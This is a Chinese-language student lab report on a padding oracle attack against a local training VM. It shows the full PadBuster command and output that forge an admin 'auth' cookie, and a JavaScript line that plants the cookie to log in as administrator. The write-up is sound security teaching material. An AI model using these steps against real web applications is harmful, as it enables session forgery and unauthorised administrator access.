# Padding Oracle Attack

## 实验环境

+ `Google Chrome` 浏览器
+ `Oracle VM VirtualBox`
+ `Linux (Oracle 64-bit)`
+ `Ubuntu 20.04`

## 实验目的

利用Padding Oracle在不知道密钥的情况下解密任意密文，或者构造出任意明文的合法密文。

## 实验原理

**一、Padding Oracle Attack的条件** 

+ 攻击者能够获得密文，以及密文对应的IV（初始化向量）
+ 攻击者能够触发密文的解密过程，且能够知道密文的解密结果

对于第一点，密文是我们攻击的目标，从cookie、敏感数据等很多地方自然可以获得。密码学里的IV，并没有保密性的要求，所以对于使用CBC-MODE的加密算法来说，IV经常会随着密文一起发送。常见的做法是将IV作为一个前缀，附着在密文的前面。对于CBC-MODE来说，IV的长度必须与分组的长度相等。**padding oracle attack是通过验证解密时产生的明文是否符合padding的原则，来判断解密是否成功的。**

**二、`padbuster`工具**

`PadBuster`是Kali Linux提供的一款专向工具。该工具使用`Perl`语言编写，可以暴力破解访问密钥，获取指定文件的内容。

## 实验过程

+ 搭建实验环境

  <img src="img\搭建环境.png"/>

+ 查看虚拟机地址并且访问

  <img src="img\登陆成功.png"/>

+ 创建用户并登录，获取cookie

  <img src="img\注册登录.png"/>

  ```
  cookie = Ykf8QRowsqaAmdG7WGRsbydhV52QPEnV
  ```

+ 在`Ubuntu`虚拟机中下载 `PadBuster` 并且安装相关依赖

  ```
  git clone https://github.com/AonCyberLabs/PadBuster.git
  cd PadBuster
  ```

  <img src="img\下载工具.png"/>

  ```
  #安装依赖
  perl -MCPAN -eshell
  cpan> install Bundle::LWP
  sudo apt-get install libcrypt-ssleay-perl
  sudo apt-get install libwww-perl
  ```

  利用工具生成新的cookie，在网页修改cookie后刷新即可成功**以管理员身份登录** 。

  ```
  cuc@cuc-lab:~/PadBuster$ perl padBuster.pl http://192.168.56.104/index.php Ykf8QRowsqaAmdG7WGRsbydhV52QPEnV 8 --cookies auth=Ykf8QRowsqaAmdG7WGRsbydhV52QPEnV -encoding 0 -plaintext user=admin
  
  +-------------------------------------------+
  | PadBuster - v0.3.3                        |
  | Brian Holyfield - Gotham Digital Science  |
  | labs@gdssecurity.com                      |
  +-------------------------------------------+
  
  INFO: The original request returned the following
  [+] Status: 200
  [+] Location: N/A
  [+] Content Length: 1188
  
  INFO: Starting PadBuster Encrypt Mode
  [+] Number of Blocks: 2
  
  INFO: No error string was provided...starting response analysis
  
  *** Response Analysis Complete ***
  
  The following response signatures were returned:
  
  -------------------------------------------------------
  ID#     Freq    Status  Length  Location
  -------------------------------------------------------
  1       1       200     1388    N/A
  2 **    255     200     15      N/A
  -------------------------------------------------------
  
  Enter an ID that matches the error condition
  NOTE: The ID# marked with ** is recommended : 2
  
  Continuing test with selection 2
  
  [+] Success: (196/256) [Byte 8]
  [+] Success: (148/256) [Byte 7]
  [+] Success: (92/256) [Byte 6]
  [+] Success: (41/256) [Byte 5]
  [+] Success: (218/256) [Byte 4]
  [+] Success: (136/256) [Byte 3]
  [+] Success: (150/256) [Byte 2]
  [+] Success: (190/256) [Byte 1]
  
  Block 2 Results:
  [+] New Cipher Text (HEX): 23037825d5a1683b
  [+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d
  
  [+] Success: (1/256) [Byte 8]
  [+] Success: (36/256) [Byte 7]
  [+] Success: (180/256) [Byte 6]
  [+] Success: (17/256) [Byte 5]
  [+] Success: (146/256) [Byte 4]
  [+] Success: (50/256) [Byte 3]
  [+] Success: (132/256) [Byte 2]
  [+] Success: (135/256) [Byte 1]
  
  Block 1 Results:
  [+] New Cipher Text (HEX): 0408ad19d62eba93
  [+] Intermediate Bytes (HEX): 717bc86beb4fdefe
  
  -------------------------------------------------------
  ** Finished ***
  
  [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
  -------------------------------------------------------
  
  ```

  修改cookie:

  ```
  document.cookie='auth=BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA';
  ```

  <img src="img\以管理员身份登录.png"/>

## 实验遇到的问题以及解决办法

+ 在浏览器上访问虚拟机出现错误

  <img src="img\访问不了.png"/>

  解决办法：删除虚拟机中多余的镜像，只留下Padding Oracle镜像，再重新访问即可。

+ 使用`perl padBuster.pl`时报错：

  ```
  cuc@cuc-lab:~/PadBuster$ perl padBuster.pl http://192.168.56.104/index.php Ykf8QRowsqaAmdG7WGRsbydhV52QPEnV 8 --cookies auth=Ykf8QRowsqaAmdG7WGRsbydhV52QPEnV -encoding 0
  Can't locate LWP/UserAgent.pm in @INC (you may need to install the LWP::UserAgent module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.30.0 /usr/local/share/perl/5.30.0 /usr/lib/x86_64-linux-gnu/perl5/5.30 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl/5.30 /usr/share/perl/5.30 /usr/local/lib/site_perl /usr/lib/x86_64-linux-gnu/perl-base) at padBuster.pl line 13.
  BEGIN failed--compilation aborted at padBuster.pl line 13.
  
  ```

  解决办法：是`libwww-perl`配置问题，安装后即可解决

  ```
  sudo apt-get install libwww-perl
  ```

## 参考文献

+  [Padding Oracle Attack 实验指南](https://pentesterlab.com/exercises/padding_oracle/course)
+ [Padding Oracle Attack的一些细节与实现](http://wjhsh.net/zlhff-p-5519175.html)
+ [Can't locate LWP/UserAgent.pm报错](https://blog.csdn.net/zzz_781111/article/details/5026133)